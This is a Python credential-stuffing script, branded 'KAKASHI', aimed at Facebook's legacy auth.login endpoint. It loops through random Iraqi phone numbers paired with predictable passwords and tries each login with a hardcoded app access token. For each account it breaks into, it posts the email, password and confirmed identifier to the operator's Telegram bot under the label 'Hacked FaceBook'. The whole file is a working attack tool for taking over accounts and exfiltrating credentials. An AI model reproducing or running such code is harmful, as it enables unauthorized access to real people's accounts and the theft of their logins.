import requests, sys, time, os, random, pyfiglet, colorama
from time import sleep
import webbrowser
webbrowser.open('https://t.me/C2C_C')
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
os.system('clear')
print(str(pyfiglet.figlet_format('KAKASHI')) + f"{S} </>\\• ──────────── •")
print(f"By {colorama.Fore.CYAN} {colorama.Fore.RESET}")
ID = input('𝗜𝗗 ')
tok = input('𝙏𝙊𝙆𝙀𝙉 ')
print(f"{S}• ──────────── •")
user = '1234567890'

def code_whisper(email, password):
    url = 'https://api.facebook.com/method/auth.login'
    headers = {'user-agent':'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',  'Accept-Language':'en-US,en;q=0.5'}
    data = {'email':email,  'password':password, 
     'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',  'locale':'en_DZ',  'format':'JSON'}
    req = requests.post(url, headers=headers, data=data)
    id = str(req.json()['uid'])
    con = str(req.json()['identifier'])
    tkn = str(req.json()['access_token'])
    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.🇹. Hacked FaceBook From @C2C_C.\n ︎.• ──────────── • \n. E-mail ==> {email} \n.🇹💸 PassWord ==> {password}\n.📨. Confirmed E-mail  {con}\n.• ──────────── • \n.. "
    i = requests.post(tlg)
    print(f"{G}𝘬𝘢𝘬𝘢𝘴𝘩𝘪࿖ .\n• ──────────── •\n.💸. ID  {id}\n.✉. E-mail ==> {email} \n.💸 PassWord  {password}\n.📨. Confirmed E-mail  {con}\n.💸. Access Token  {tkn} \n• ──────────── •\n.. Tele  ")


while True:
    whisper = str(''.join((random.choice(user) for i in range(7))))
    email = '+964771' + whisper
    password = '0771' + whisper
    if email == '':
        exit()
    if password == '':
        exit()
    url = 'https://api.facebook.com/method/auth.login'
    headers = {'user-agent':'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',  'Accept-Language':'en-US,en;q=0.5'}
    data = {'email':email,  'password':password, 
     'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',  'locale':'en_DZ',  'format':'JSON'}
    req = requests.post(url, headers=headers, data=data)
    if 'access_token' in req.json():
        code_whisper(email, password)
    if '(405)' in req.json()['error_msg']:
        print(f"{S}CheckPoint {email}:{password}")
    else:
        print(f"{E}E-mail  {email} | PassWord  {password}")
